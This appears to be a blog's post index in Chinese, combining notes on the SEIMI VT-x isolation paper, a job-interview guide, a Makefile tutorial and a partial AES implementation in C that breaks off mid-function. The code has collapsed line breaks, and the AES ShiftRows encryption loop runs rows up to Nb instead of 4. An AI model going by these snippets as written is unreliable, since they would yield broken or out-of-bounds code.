S-page和U-page是根据操作系统中固有的U/Sbit标志位来区分的 trusted code 通常是kernel， 而untrusted code通常是user code 用户代码默认是无法访问S-page的？对哦，但是user code是放在ring0级别的，所以应该是可以访问S-page 拦截特权指令：SEIMI需要拦截掉VMX non-root模式下ring 0级别的所有的特权指令及其对privileged hardware features的访问 坦白说，我真的不知道是怎么实现的特权指令的拦截，可能类似于对于系统调用的hook？ 找到所有的特权指令以及在ring 0 级别和ring 3级别表现不同的指令。 自动插入随机的操作数并在ring 3级别下运行 破坏指令的执行条件、触发VM exit 可以利用Intel的VT-x技术来让所有EXIT-Type的指令在VMX non-root模式下执行时触发VM eixts. 对于EXP-Type的指令，抛出不同类型的异常 抛出#UD：取消VMCS对这些指令的支持 抛出#GP：SEIMI不应该允许ring 0级别的应用程序修改任何段寄存器。即不允许ring 0状态下的指令切换段 观察到修改段寄存器时，硬件将会使用target selector来访问段描述符表。如果段描述符表为空，CPU将会抛出#GP异常 如何确保在段描述符表为空时程序能够正确执行？如何确保与段相关的指令的正常工作？ 每个段寄存器都有两个部分，一个可见部分用于段选择符，另一个不可见的部分用于描述符缓存。 在执行不切换段的指令时，硬件直接从描述符缓存中读取数据，只有当指令切换段时，硬件才会访问段描述符表并把目标段的信息加载到cache中。段选择符用于访问段描述符表。 因此将正确的段描述符信息存放在描述符cache中，并且将段描述符表清空。在VMCS的 guest-state字段存放选择器和段描述符的内容。 在进入VMX non-root模式时，信息将会被直接加载到guest segment register，然后把GDTR和LDTR寄存器的base和limit字段设置为0.这样不会影响到不切换段的指令的执行，而会在切换段的指令执行时抛出异常。 SEIMI捕获异常后检查操作是否合法，如果合法SEIMI将请求的段信息存放到VMCS的段寄存器中并且返回到VMX non-root模式。合法是指的程序应该在ring 3级别下访问而不是在ring 0级别下访问。但是程序不是在ring 0级别下运行的吗 抛出#PF： SYSEXIT/SYSRET将会切换段并且向描述符缓存中填充固定的值而不需要访问描述符表，因此不会抛出#GP异常。 但是SYSEXIT/SYSRET指令将会导致权限切换到ring 3，而这时ring 3级别的进程将无法访问S-page（note：内存管理时前面的255个page都是S-page,只能由ring 0级别的进程访问。剩下的是U-page，这个可以访问。）。因此当CPU执行下一条指令时将会抛出异常。我明白了，U-page中保存的是敏感数据，而指令保存在S-page中，切换到ring 3后，CPU将无法访问下一条指令 使指令的执行无效：对于INV-Type类型的指令，使这些指令无效化 什么叫使指令无效化？ 与CR*寄存器相关的指令： Intel VT-x技术允许通过配置VMCS来控制这些指令的执行。VMCS中的CR0和CR4寄存器有guest/host 掩码和read shadows。guest/host掩码中的每个bit指明了CR0/CR4中相对应bit的所有权——0为guest，1为host。SEIMI将所有的mask设置为1，read shadows所有的位为0. 这样从寄存器中读到的数据始终为0，而写将不会修改寄存器的值。 CR2寄存器用于在#PF异常出现时保存错误的地址，#PF将会直接触发VM exitts,并且地址保存在VMCS上，因此CR2实际上没有任何作用。 SWAPGS用来快速交换GS和IA32_KERNEL_GS_BASE MSR寄存器中的值，SEIMI将两个寄存器中的值始终保持相同，因此SWAPGS毫无意义 LAR和LSL指令用来获取访问权限，VERR和VERW用来验证一个段是否可读可写，前面已经将所有的段描述符表清空，因此这几条指令将会因此descriptor load segment violation，RFLAG.ZF标志位将被设置为0。SEIMI将会忽略掉这些指令 CLI/STI可以修改系统的标志位IF，POPF/POPFQ可以用来修改IOPL和AC。 IF标志位用来屏蔽硬件中断，IOPL用来控制I/O相关指令的条件执行 SEIMI中修改IF和IOPL没有作用因为中断和I/O指令将会触发无条件的VM exits。 如何消除POPFQ在AC上的影响？ 在POPFQ之前插入一条and指令，因此stack对象的AC标志位将永远是0。 同时在威胁模型中，攻击者不能劫持控制流，因此无法跳过and 重定向和交付内核处理程序 系统调用处理：SYSCALL指令不能实现控制流从VMX non-root或VMX root模式的转换。 通过将代码页映射到目标内存空间，来使用VMCALL替换SYSCALL。 ​ ​ ​ ​ ​ ​ ​ ​ ​ " }, { "title": "秋招补录不完全指南", "url": "/_posts/%E7%A7%8B%E6%8B%9B/", "categories": "面试", "tags": "面试, 秋招补录", "date": "2022-02-11 00:00:00 +0000", "snippet": " 我的面试经验背景在我写下这篇文章时，我通过了字节跳动和华为两家公司的面试，并即将与字节跳动签约。之前的半年忙于考研而并没有准备工作，因此相比于其他参加秋招的同学来说，我的招聘流程无疑是十分短暂的，从2021年12月28日考研结束后准备简历，到2022年2月7日接到字节的offer，一共经过了一个多月的时间。总的来说，我对offer还算满意，现将经验记录如下，以期对后来人有所帮助。另外，这...", "content": " 我的面试经验背景在我写下这篇文章时，我通过了字节跳动和华为两家公司的面试，并即将与字节跳动签约。之前的半年忙于考研而并没有准备工作，因此相比于其他参加秋招的同学来说，我的招聘流程无疑是十分短暂的，从2021年12月28日考研结束后准备简历，到2022年2月7日接到字节的offer，一共经过了一个多月的时间。总的来说，我对offer还算满意，现将经验记录如下，以期对后来人有所帮助。另外，这篇文章仅针对互联网公司开发岗位校招秋招补录环节，至于非开发岗、非校招，仅供参考。补录流程首先，秋招补录大概包括如下几个环节(部分公司可以跳过标有星号的阶段）： 网申/内推 简历筛选 笔试* 技术面试 HR面试 / 主管面试 * 发放offer网申/内推投递这一阶段标志着整个流程的正式开始。在这里借用Wu Zhengke的一句话：永远优先通过内推投递，除非万不得已，不要自己直接网申。坦白说，内推与网申最大的不同在于，内推能够优先进入hr的筛选范围，甚至于对于部分公司来说，内推能够免掉笔试，直接进入技术面。另外，在秋招补录阶段，由于秋招大批量的offer已经发放完毕，企业剩余的hc已经不多，大部分公司并没有正式的补录阶段，甚至关闭了网申的入口，因此这时候内推往往是唯一的投递途径。在牛客、leetcode、各种交流群、校内论坛上常常有企业内部的员工发帖打广告，因此获取内推资格相当简单。但是如果需要对方帮忙查看简历投递进度，那么选择自己认识的员工内推更加合理。如果你的算法水平过关，你也可以通过LeetCode周赛来获得企业的内推资格，虽然我AK了两次周赛并拿到了内推，但对这两个企业并不感兴趣，并没有真正投递，因此我对周赛能够带来多大的帮助并不清楚。我在这个阶段几乎投递了听说过的所有企业，在短时间内给我反馈的公司有字节跳动、华为、Intel、阿里、shopee。简历筛选根据我的经验，以上海交通大学信息安全专业的文凭，几乎可以平趟大厂的筛选关，除了网易的Android开发和小红书的后台开发岗之外，其他的公司大都通过了简历筛选，并向我发出了面试邀请。基于岗位和公司的考量，我参加后续考察环节的公司有Intel、华为和字节跳动。笔试笔试往往是对于算法的考察，类似于OJ。与Leetcode的不同之处在于，需要自己写输入输出函数，因此在笔试前需要熟悉一下输入输出操作，以免临时忘记。如果有OI/ACM基础，通过笔试自然不在话下。如果没有相应的基础，只要在Leetcode上投入一定的时间，也足以应对大部分题目。据说部分公司的题目会包含对计算机基础知识，如编译原理、操作系统等的考察，但我并没有遇到，因此略过不提。据我的经历，笔试只是一个门槛，对于最终的结果并没有决定性作用。分不在高，过了就行。后续的几轮技术面，才是真正决定命运的时候。技术面试这一部分往往包括2 ~ 3轮，每次的时间在20min~1h不等，通常包括对于基础知识和项目经历的考察，再辅以1个算法题的测试，难度一半不会超过leetcode medium，与上面一样，刷刷leetcode足以应付。部分外企可能会采取另外一种面试方式：给出一个明确的任务，让你围绕这个主题进行研究和操作，并在后续的面试中向面试官介绍，在我所投递的Intel亚太研发中心的Edge Computing组中给出了如下的要求，难度并不高，但开放性的题目属实让我不知道应该做到什么程度，因此我主动结束了面试流程：A Technical Exercise with KIND (Kubernetes in Docker Containers)Requirements:1.\tDeploy a 3-node KIND cluster on the Linux host. In this cluster, there should be 1 controller node and 2 worker nodes2.\tDo research about KIND and related key technologies, and present your understandings on the following topics, but not limited:a.\tKubernetes (K8s) cluster architecture and key components (modules) on the architecture diagramb.\tKIND architecturec.\tLinux Container technologies3.\tRecord all the problems and questions which you run into in this tech exercise and describe the questions with us in the report-out sessionReport-out session: presentation what you have done for 1~3 above, during the next round of phone or Face-2-Face interview.References:1.\thttps://kind.sigs.k8s.io/2.\tAny other online informationHR面试/主管面试大部分公司在通过前面的笔试和技术面试之后，会进入hr面阶段。不同公司对于该阶段的定位不同。字节的hr面仅仅是与我进行了工作地点、工作内容、公司介绍等问题的沟通，而华为的主管面问了一些奇奇怪怪的问题，如“你有没有遇到过什么比较困难的问题”之类的。只要回答的不是过于出格，一般不会在这一轮被筛掉。同时，你还可能通过这一轮感受不同企业的企业文化or价值观，通过几轮面试，字节给我的感觉更加舒服，而华为更加具有侵略性和压迫感，这也促使我最终选择了字节。发放offer公司一般会在面试通过后一段时间内与你联系，一般可能不会超过两周（由于我在年底完成的面试，之后就是除夕，因此不太清楚正常的时间）。我认为在hr口头通知通过面试后不应立即终止其他公司的面试流程，一方面公司可能会突然毁约，另一方面手握多家公司的offer能让你在hr面前占据主动，并且对不同的offer进行充分的比较。然而，在企业发放正式的offer并确认岗位之后，出于道德，应该考虑终止其他公司的流程，以将对应的hc释放，以免占着茅坑不拉屎。面试指南面试前的准备虽然互联网并不卡死学历，但是出身985的科班生往往要比双非本科生能够更加轻易的越过某些门槛。如我上面所说的，上交本基本能够帮你顺利通过几乎所有公司的简历筛选，相对于因为学历而拿不到面试资格的人来说，你已经赢在了起跑线上。当然，真正进入面试之后，学历基本就没用了。在面试中，最重要的是两点：专业课的基础知识与多写代码的动手能力。前者需要认真学习计算机的各门专业课程，具体来说，大致是数据结构、操作系统、计算机网络、计算机组成、计算机系统结构、编译原理、程序设计以及围绕这些课程而展开的进阶课程等。学好这些课程，并不意味着在学校开设的课程中取得高分，或者说，取得高分并不意味着你掌握了这些课程的精髓。毕竟， 国内大部分大学的本科教学，不是濒临崩溃，而是早已崩溃。坦白说，我认为信安的培养计划上的大部分课程只是徒有虚名，真正学到课程的精髓，还是要靠自己课下去找书看。一年之后的今天，我依然不理解为什么薛质教授能够在操作系统课上将约1/3的篇幅用来讲解shell命令，甚至还有一部分同学认为应该讲。难道shell的使用不是Google就能学明白的吗？我依然不理解为什么在2020年，计算机网络依然将大量的篇幅用在ALOHA等上古协议中，而不是聚焦更加实用的HTTP 2.0甚至3.0。好在，我选择自己读完了《计算机网络——自顶向下方法》《现代操作系统 原理与实现》等一系列比较优秀的教材。关于代码能力的提高，无他，唯手熟耳。不少同学可能苦恼于想写代码，但是不知道从何写起，对此，我认为一方面可以通过完成公开课的lab，就我做过的几个lab而言，通常都有完整的代码框架和tutorial，使得上手难度不至于过高。另一方面，可以选择一些书籍，如XXXX真象还原等，在书的指引下写出一个完整的project。据我观察，身边的很多同学学习的方式仅仅是背书，代码能不写就不写，能抄就抄，四年过去，代码水平并没有太大提升。显然，这往往并不足以拿到令人满意的offer。非常遗憾的是，我的代码训练量并不够，甚至于我在面试时拿不出足够多的项目以证明我的能力，当然这也影响到了我的最终评级。就我个人而言，我非常佩服张弛(aka. 迟先生)，毫不夸张地讲，他的代码能力至少顶100个我。当然，交大人才济济，身边还有诸多代码能力优秀的同学，这也激励着我不断追赶他们的脚步。在平时打好基础之外，还需要在面试前一段时间抽出一定的时间投入到leetcode中，题量视基础而定，一般而言剑指Offer + hot 100足以。由于我在大二以来闲暇时间一直在与wzy一起做leetcode玩，因此Leetcode并没有成为我的阻碍。面试前几天，多看看岗位相近的面经我认为是有帮助的，至少会有查缺补漏的作用。但是，如果本身基础不够扎实，想靠面经逆天改命，或许几率并不大。根据我的经验，面试大概包括这么几个部分： 自我介绍。自我介绍基本按照简历来讲，可以事先组织一下语言，以免逻辑混乱。 基础知识。就我所面试的后端开发/基础架构而言，对于基础知识的考察主要围绕系统和网络两部分，其中可能穿插一些语言or算法等零碎的知识，很多问题在面经中很常见，但是如何答出自己的理解，展现自己的优势一面，或许还要多思考和总结。 项目设计。无论项目多还是少，建议至少选择一个或两个自己重度参与并能够完整讲明白的项目重点准备，面试官在你介绍项目时往往会包含一些基础知识的穿插和刨根问题的追究，这就要求真正明白自己代码每一行为什么这么写。 算法题。字节的面试是使用飞书自带的在线编辑平台，华为的面试是桌面投屏IDE，一般不会写输入输出，但还是需要写测试用例并通过测试，因此在平时练习时还是要多思考如何快速写出bug free的代码。 反问环节。这一环节并没有太大的影响，一般可以问“说说对我的评价”、“你们部门的技术栈”、“介绍一下你们工作的内容”或者之前自己没答上来的问题等。面试的核心还是将自己的能力充分暴露给面试官，保持自信、保持沟通，维持良好的心理状态。“一俊遮百丑”，我认为木桶效应并不是绝对的，在面试时要尽可能把握谈话的主动权，有意识地将面试官的问题引导到自己擅长的方面去，当然，具体怎么操作，就看各自的能力了。面试后想必面试完对于自己的水平也有了比较清醒的认识，如果面试中问题答出来八九成，那么大概率可以顺利通过，否则，或许可以准备找下家或是等待被捞。鉴于面试的套路相似，因此对于面试中暴露出来的问题应当及时解决，无论是基础知识的缺憾，抑或是代码设计不清晰，都要查缺补漏，但愿不会出现同样的问题。我们不应当因为一次面试的失败而灰心丧气，也不应因一次面试的成功而沾沾自喜。无论如何，保持乐观、自信与谦逊，追求无限进步。拓展阅读一路走来，我阅读了许多有价值的文档，将其列举如下，一并感谢作者的分享： [校招面试不完全指南 无辄的栈 (zackwu.com)](https://www.zackwu.com/posts/2020-10-05-an-incomplete-guide-to-campus-recruitment-interviews/) 上海交通大学生存手册 [iPotato 如何在面试中筛选/不做一个「背题家」](https://ipotato.me/article/66) 写给即将学习编程的大学新生 - Randy’s Blog (lutaonan.com) TeachYourselfCS-CN The Missing Semester of Your CS Education · the missing semester of your cs education (mit.edu) etc I’m always a noob at Computer Science.所以，欢迎批评指正。" }, { "title": "Makefile学习", "url": "/_posts/makefile/", "categories": "Makefile", "tags": "Makefile", "date": "2022-01-03 00:00:00 +0000", "snippet": " Learning by Doing.Makefile学习Makefile规则tareget ... : prerequisites ...command......target是目标文件，可以是Object File 也可以是执行文件，还可以是标签（label), prerequisites是生成target需要的文件或目标command是make需要执行的指令如果prerequisit...", "content": " Learning by Doing.Makefile学习Makefile规则tareget ... : prerequisites ...command......target是目标文件，可以是Object File 也可以是执行文件，还可以是标签（label), prerequisites是生成target需要的文件或目标command是make需要执行的指令如果prerequisites中有任何一个文件比target要新，command中的命令就会被执行Exampleedit : main.o kbd.o command.o display.o \\insert.o search.o files.o utils.o\tcc -o edit main.o kbd.o command.o display.o \\insert.o search.o files.o utils.omain.o : main.c defs.h\tcc -c main.ckbd.o : kbd.c defs.h command.h\tcc -c kbd.ccommand.o : command.c defs.h command.h\tcc -c command.cdisplay.o : display.c defs.h buffer.h\tcc -c display.cinsert.o : insert.c defs.h buffer.h\tcc -c insert.csearch.o : search.c defs.h buffer.h\tcc -c search.cfiles.o : files.c defs.h buffer.h command.h\tcc -c files.cutils.o : utils.c defs.h\tcc -c utils.cclean :\trm edit main.o kbd.o command.o display.o \\\tinsert.o search.o files.o utils.o\t上面的代码中，目标文件中包含了执行文件和中间目标文件（即*.o），依赖文件就是目标文件冒号后面的文件。这样就构成了最终的目标文件与原始代码之间的依赖关系。在依赖关系后，后续的command定义了如何生成目标文件的命令，以tab开头。clean是一个动作名字，执行其后的命令可以需要在make后手动添加标签，即 make clean，类似地，可以在一个makefile中定义不用的编译或编译无关的命令，如打包/备份等。变量在makefile中可以使用变量来简化文件的编写。在makefile中变量可以被视为字符串，类似于C中的宏？例如：object = main.o kbd.o command.o display.o insert.o searach.o files.o utils.o则可以通过$(objects)来使用这个变量。这样，上面的代码就可以化简为：insert.o search.o files.o utils.oedit : $(objects)\tcc -o edit $(objects)main.o : main.c defs.h\tcc -c main.ckbd.o : kbd.c defs.h command.h\tcc -c kbd.ccommand.o : command.c defs.h command.h\tcc -c command.cdisplay.o : display.c defs.h buffer.h\tcc -c display.cinsert.o : insert.c defs.h buffer.h\tcc -c insert.csearch.o : search.c defs.h buffer.h\tcc -c search.cfiles.o : files.c defs.h buffer.h command.h\tcc -c files.cutils.o : utils.c defs.h\tcc -c utils.cclean :\trm edit $(objects)自动推导make看到.o文件，会自动把.c文件作为他的依赖，并且 cc -c xxx.c也会被自动推导出来。则可进一步化简为：objects = main.o kbd.o command.o display.o \\insert.o search.o files.o utils.oedit : $(objects)\tcc -o edit $(objects)$(objects) : defs.hkbd.o command.o files.o : command.hdisplay.o insert.o search.o files.o : buffer.h.PHONY : cleanclean :\trm edit $(objects).PHONY说明clean是一个伪目标文件。.delete_on_error: 如果一条命令返回一个非零返回值，make将会停止执行命令。如果在makefile中添加了delete_on_error，那么在make失败时将会删除掉新编译出的target。引用其他的MakefileMakefile中可以使用include关键字将别的Makefile包含进来。include和文件名之间可以用一个或多个空格隔开。Makefile寻找文件的顺序： 显式指出的文件位置 当前目录 如果make 执行时有-l 或 –include-dir参数，那么make就会在这个参数所指定的目录下去寻找。 如果&lt;prefix&gt;/include (e.g. /usr/local/bin或/usr/include)存在,make会到该目录下去寻找.如果有文件没有找到，make会生成警告，但不会立刻退出，而是继续载入其他文件，在完成整个makefile的读取后，make再重试这些没有找到或无法读取的文件。若需要make跳过无法读取的文件，则需要在include前加一个’-‘.规则规则包含两个部分，一个是依赖关系，另一个是生成目标的方法。tareget ... : prerequisites ...command......Makefile中存在特殊变量VPATH，如果没有指明这个变量，make会在当前的目录中寻找文件的依赖关系。如果在当前目录中没有找到，会到VPATH所指明的目录中寻找。VPATH = src:../headers如上，makefile将会按照src, ../headers这样的顺序寻找，不同的目录之间用’:’分割。另一个设置文件搜索路径的方法：使用make的vpath关键字 vpath &lt;pattern&gt; &lt;directories&gt; : 为符合模式pattern的文件指定搜索目录 vpath &lt;pattern&gt; ： 清除符合模式pattern的文件的搜索目录 vpath：清除所有被设置好的文件搜索目录pattern中需要包含%，匹配零或若干字符。例如:vpath %.h ../headers表示在../headers目录下搜索所有以.h结尾的文件隐式规则 编译C代码：n.o通过命令$(CC) -c $(CPPFLAGS) $(CFLAGS)，依赖于文件n.c，自动编译出.o文件 编译C++代码：n.o通过命令$(CXX) -c $(CPPFLAGS) $(CXXFLAGS)，依赖于文件n.cc或n.cpp，自动编译出.o文件。 链接单个.o文件：n通过$(CC) $(LDFLAGS) n.o $(LOADLIBES) $(LDLIBS)，自动编译成可执行文件。其中使用的变量分别为： CC: 编译C代码使用的编译器，默认为cc CXX: 编译C++代码使用的编译器，默认为g++ CFLAGS: C编译器使用的额外参数 CXXFLAGS: C++编译器使用的额外参数 CPPFLAGS: 传递给C预处理器的额外参数 LDFLAGS: 调用链接器时链接器使用的参数例如：CC = gccblah: blah.oblah.c:clean: \trm -f blah*输出为:&gt; makegcc -c -o blah.o blah.cgcc blah.o -o blahStatic Pattern Rulestargets...: target-pattern: prereq-patterns ...\tcommandsThe essence is that the given target is matched by the target-pattern (via a % wildcard). Whatever was matched is called the stem. The stem is then substituted into the prereq-pattern, to generate the target’s prereqs.主要用于自动将.c文件编译成.o文件，例如：// manual objects = foo.o bar.o all.oall: $(objects)# These files compile via implicit rulesfoo.o: foo.cbar.o: bar.call.o: all.call.c:\techo \"int main() { return 0; }\" &gt; all.c%.c:\ttouch $@clean:\trm -f *.c *.o all//auto:objects = foo.o bar.o all.oall: $(objects)# These files compile via implicit rules# Syntax - targets ...: target-pattern: prereq-patterns ...# In the case of the first target, foo.o, the target-pattern matches foo.o and sets the \"stem\" to be \"foo\".# It then replaces the '%' in prereq-patterns with that stem$(objects): %.o: %.call.c:\techo \"int main() { return 0; }\" &gt; all.c%.c:\ttouch $@clean:\trm -f *.c *.o all区别在于，使用通配符的方式引入了$(objects): %.o: %.c自动为每个.o文件指定了其使用的其依赖的.c文件，而在手动方式中需要依次为每个.o文件指定.c文件，但是似乎只适用于.c文件与.o文件一对一的情况。filter函数可以被用在static pattern rules中从变量中分离出正确的文件，例如:obj_files = foo.result bar.o lose.osrc_files = foo.raw bar.c lose.c.PHONY: allall: $(obj_files)$(filter %.o,$(obj_files)): %.o: %.c # 取出Object中的.o文件\techo \"target: $@ prereq: $&lt;\"$(filter %.result,$(obj_files)): %.result: %.raw # 取出object中的.result文件\techo \"target: $@ prereq: $&lt;\" %.c %.raw:\ttouch $@clean:\trm -f $(src_files)Pattern rules%通配符匹配任何非空字符串，其他的字符匹配其自身。%.o : %.c\t$(CC) -c $(CFLAGS) $(CPPFLAGS) $&lt; -o $@完整的makefile版本：CC = gccobj_files = blah.o test.o.PHONY: allall: $(obj_files)\t$(obj_files): %.o: %.c%.c:等价于%.o: %.c \t$(CC) -c $(CFLAGS) $(CPPFLAGS) $&lt; -o $@双冒号规则：使用双冒号允许为一个target定义多条指令，如果使用单冒号，将会报warnning 并且只执行第二条指令伪目标如果需要一次性生成多个可执行文件，但只要输入一个make，并且所有的目标文件都写在一个makefile中，可以通过伪目标来实现：all : prog1 prog2 prog3.PHONY : allprog1 : prog1.o utils.o\tcc -o prog1 prog1.o utils.oprog2 : prog2.o\tcc -o prog2 prog2.oprog3 : prog3.o sort.o utils.o\tcc -o prog3 prog3.o sort.o utils.o如上，声明了一个all伪目标，其依赖于其他三个目标。由于伪目标总是被执行，所以其依赖的三个目标总是不如all新，因此另外三条规则总是会被执行，于是就达到了一口气生成多个目标的目的。书写命令默认的shell为/bin/sh，可以在makefile开头通过设置变量SHELL来改变一、 显示命令make默认将执行的命令行在命令执行前输出到屏幕，若使用@在命令行前，则这个命令将不被显示。若在make执行时带入参数-n 或 –just-print，则只是显示命令而不执行，可用于调试makefile，查看命令的执行顺序。make -s 或 –slient可以全面禁止命令的显示二、命令执行如果让下一条命令在上一条命令执行的基础上进行，则应该使用’;’分隔这两条命令，而不是换行。例如：exec:\tcd /home/hchen; pwd中断或中止make，如果在执行make时在键盘输入ctrl+c，make将会删除其刚刚生成的targets三、命令出错忽视命令出错，即无论正确不正确都认为是正确的，则在命令前加’-‘。例如：clean:\t-rm -f *.o或给Make添加 -i或 –ignore-errors，忽略所有命令的报错make -k 或 –keep-going，表示如果某条规则的命令出错了，那么终结该命令的执行，但继续执行其他规则四、嵌套执行make把不同模块或不同功能的源文件放在不同的目录中，可以在每个目录中都书写一个该目录的Makefile。例如，有一个子目录subdir,这个目录下有Makefile指明了这个目录下文件的编译规则，则父目录的Makefile可以这样， 其中应该使用$(MAKE)而不是使用make，这样传递给被调用的make的参数将不会影响正在使用的make：new_contents = \"hello:\\n\\ttouch inside_file\"all:\tmkdir -p subdir\tprintf $(new_contents) | sed -e 's/^ //' &gt; subdir/makefile\tcd subdir &amp;&amp; $(MAKE)\tclean:\trm -rf subdir在Make中使用exportexport的语法与sh相同，功能相似，但是并不相关export的功能是在上级makefile中创建的变量可以供被调用的下级makefile使用。define可以将相同的一组命令序列打包为一个特定的命令。define run-yaccyacc $(firstword $^)mv y.tab.c $@endef之后可以通过foo.c:foo.y\t$(run-yacc)执行定义的命令. define的命令在一个分离的shell中执行。命令行参数和override使用override标识符来通过命令行覆盖定义的变量，例如 在命令行中make option_one=hi:override option_one = did_overrideoption_two = not_overrideall:\techo $(option_one)\techo $(option_two)Target-specific variablesall: one = coolall: \techo one is defined: $(one)other:\techo one is nothing: $(one)使用变量变量在声明时需要指定初值，使用时需要加上$，例如：objects = program.o foo.o utils.oprogram : $(objects)\tcc -o program $(objects)$(objects) : defs.h自动变量以及通配符 自动变量 含义 $@ target name $&lt; dependency 第一个文件的名字 $^ 全部dependencies 名字，无重复 $? prerequisites中比target更新的文件名 $+ 全部dependencies名字，有重复，适用于在链接器中重复值有意义的情况 变量嵌套：可以把变量的真实值放到后面定义。例如：include_dirs := -Ifoo -IbarCFLAGS := $(include_dirs) -O这样前面的变量不能使用后面的变量，而只能使用他前面定义好了的变量变量替换：可以替换变量中共有的部分，例如foo := a.o b.o c.obar := $(foo:.o=.c)将foo中的.o全部替换为.c静态模式替换:依赖于被替换字符串中有相同的模式，模式中必须包含一个%字符。例如：foo := a.o b.o c.obar := $(foo:%.o=%.c)追加变量值：使用+=，例如：objects = main.o foo.o bar.o utils.oobjects += another.o变量定义makefile中存在两种风格的变量定义： recursive: (=) 在命令被使用时产生而不是在被定义时生成完整的变量 simply expanded: (:=) 在命令被定义时生成完整的变量（可能看起来比较抽象，看看例子就懂了）# Recursive variable. print \"later\"one = one ${later_variable}# Simply expanded variable. Will not print \"later\"two := two ${later_variable}later_variable = laterall:\techo $(one)\techo $(two)因为在one被定义时，仍然保持为one ${later_variable}，直到echo使用$(one)时才会查找${later_variable}对应的值。而two使用simply expanded定义，在定义时，到上面去查找latere_variable对应的值，而此时later_variable并没有被定义，为空值，因此two = two因为此种特性，simply expanded可以用来向一个变量追加值，而recursive definitions将会抛出一个infinite loop error.除了simplye expanded之外，还可以使用+=向变量追加值，两者的区别在于，+=默认使用一个空格分隔，而simply expanded可以自行调整空格的数量，见下例：one = helloone := ${one} three //输出为hello threeone := ${one}three //输出为hellothreefoo := startfoo +=moree //输出为start moree?=仅仅在变量没有被定义时才会产生定义，e.g.:one = helloone ?= will not be settwo ?= will be setall:\techo $(one)\techo $(two)每一行末尾的空格不会被删除，而开头的空格会被删除，如果需要使用空格的变量，可以通过$(nullstring)来完成。这里有个疑问：行末尾是指什么？在下面的例子中，with_spaces=hello ，最后输出的hello自带几个空格，而单独输出nullstring为”“，输出spacew为” “, 可以认为所谓的行开头指的是等号后面开始一直到本行结束，因此变量等于单个空格会直接被忽略而作为空值，若需要使用空格则需要再加一层引用。with_spaces = hello # with_spaces has many spaces after \"hello\"after = $(with_spaces)nullstring = space = $(nullstring) # Make a variable with a single space.all: \techo \"$(snullstring)\"\techo \"$(space)\"\techo \"$(after)\"\techo start\"$(space)\"endMakefile中的条件判断if/elsefoo = okall:ifeq ($(foo), ok)\techo \"foo equals ok\"else \techo \"nope\"endif判断是否为空nullstring = foo = $(nullstring)all:ifeq ($(strip $(foo)), )\techo \"foo is empty after being stripped\"endififeq ($(nullstring), )\techo \"nullstring doesn't even have spaces\"endif判断变量是否已被定义bar =foo = $(bar)all:ifdef foo\techo \"foo is defined\"endififndef bar\techo \"buf bar is not\"endif$(makeflags)$(makeflags)表示make时通过命令行传递的参数Functions$(fn, arguments)， arguments之间不应当添加额外的空格， 除非需要。String Substitution$(patsubst pattern,replacement,text)：从text中选择与pattern匹配的单词，将其替换为replacement。其中pattern可以包含‘%’，如果replacement中也包含%，那么%将会被其对应的字符串替换。仅仅pattern中的第一个%会以这种方式被替换，后续的%将会保留。foreach$(forrach var,list,text)：其中var是list中的每个单词，对于list中的每个var，将其替换为textif$(if this-is-not-empty,then!,else!)，判断第一个参数是否为空值，若非空，则执行then，否则执行else.callmakefile通过创建变量来定义函数，并且通过$(0)等向函数传递参数。sweet_new_fn = Variable Name: $(0) First: $(1) Second: $(2) Empty Variable: $(3)all:\t# Outputs \"Variable Name: sweet_new_fn First: go Second: tigers Empty Variable:\"\t@echo $(call sweet_new_fn, go, tigers)shell functionall:\techo $(shell ls -la)REFERENCE[1]全网最牛Linux内核Makefile系统文件详解(纯文字代码) - 知乎 (zhihu.com)[2]Makefile Tutorial By Example" }, { "title": "AES算法的经典实现", "url": "/_posts/AES/", "categories": "", "tags": "AES, 分组加密算法", "date": "2022-01-03 00:00:00 +0000", "snippet": " The Design of Rijndael基本概念state: 状态矩阵，初始为输入明文/密文构成的矩阵，作为每一次轮变换的输入。Nb: state矩阵的列数，Nb = 块长 / 32cipher key: 输入的加密密钥Nk: Nk = 块长 / 32若矩阵的每个元素的长度为1Byte，则state和cipherkey分别为4 * Nb(Nk)的矩阵，其中每一列是一个块### 算法流...", "content": " The Design of Rijndael基本概念state: 状态矩阵，初始为输入明文/密文构成的矩阵，作为每一次轮变换的输入。Nb: state矩阵的列数，Nb = 块长 / 32cipher key: 输入的加密密钥Nk: Nk = 块长 / 32若矩阵的每个元素的长度为1Byte，则state和cipherkey分别为4 * Nb(Nk)的矩阵，其中每一列是一个块### 算法流程Rijndael (State, CipherKey) {\tKeyExpansion(CipherKey, ExpandedKey); \t\t//密钥扩展\tAddRoundKey(State, ExpandedKey[0]);\t\t\t\t//轮密钥加\tfor (i = 1; i &lt; Nr; i++) Round(State, ExpandedKey[i]);\t\t//轮变换\tFinalRound(State, ExpandedKey[Nr]);}Round(State, ExpandedKey[i]) {\tSubBytes(State);\tShiftRows(State);\tMixColumns(State);\tAddRoundKey(State, ExpandedKey[i]);}FinalRound(State, ExpandedKey[Nr]);1. SubBytesSubBytes是加密算法中唯一的非线性变换。对于输入矩阵中的每个元素，直接通过查表得到对应的替换元素。输入参数为4 * Nb列的矩阵state和S盒。代码如下：void SubBytes(word8 state[4][MAXBC], word8 box[256]) { int i, j; for (i = 0; i &lt; 4; i++) for (j = 0; j &lt; Nb; j++) state[i][j] = box[state[i][j]];}解密时，SubBytes的逆变换即为将box换为S盒的逆矩阵Si.2. ShiftRowsShiftRows对于矩阵的每一行进行不同长度的移位。移位的长度与Nb直接相关。移位的示意图如下：当加密时，矩阵依次左移C0，C1，C2，C3位。当解密时，依次左移Nb-C1, Nb-C2, Nb-C3位。代码如下，输入为状态矩阵state和标志位d，当d为0时表示为加密，当d为1时表示为解密：void ShiftRows(word8 state[4][MAXBC], word8 d) { word8 tmp[MAXBC]; int i, j; if (d == 0) { for (i = 0; i &lt; Nb; ++i) { for (j = 0; j &lt; Nb; j++) tmp[j] = state[i][(j + shifts[Nb - 4][i]) % Nb]; for (j = 0; j &lt; Nb; j++) state[i][j] = tmp[j]; } } else { for (i = 1; i &lt; 4; ++i) { for (j = 0; j &lt; Nb; j++) tmp[j] = state[i][(Nb + j - shifts[Nb - 4][i]) % Nb]; for (j = 0; j &lt; Nb; j++) state[i][j] = tmp[j]; } }}3.MixColumnsMixColumns以线性方式进行矩阵的列混合，即让状态矩阵成为一个特定的矩阵与它自身的乘积。加密时，对于矩阵的每一列，有其中b为置换后的矩阵，a为置换前的矩阵。运算在GF(256)中进行，对应元素之间的乘积可以通过查表ALogtable和Logtable来完成，加法实质上为异或。则MixColumns的算法实现为：void MixColumns(word8 state[4][MAXBC]) { word8 